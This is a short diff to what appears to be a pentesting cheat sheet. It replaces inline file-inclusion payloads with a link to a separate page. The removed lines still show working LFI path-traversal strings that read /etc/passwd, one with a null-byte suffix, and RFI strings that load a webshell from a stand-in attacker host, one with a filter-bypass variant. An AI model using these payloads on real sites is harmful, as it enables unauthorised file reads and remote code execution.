@@ -12,9 +12,4 @@
 
 
 ## File Access Attach
-- LFI
-  - ```index.php?page=../../../../../../../../../../etc/passwd``` 
-  - ```index.php?page=../../../../../../../../../../etc/passwd%00```
-- RFI
-  - ```index.php?page=http://attackerIP/webshell.php``` 
-  - ```index.php?page=htthttpp://attackerIP/webshell.php```
+- [File Inclusion](Attacks/file-inclusion.md)
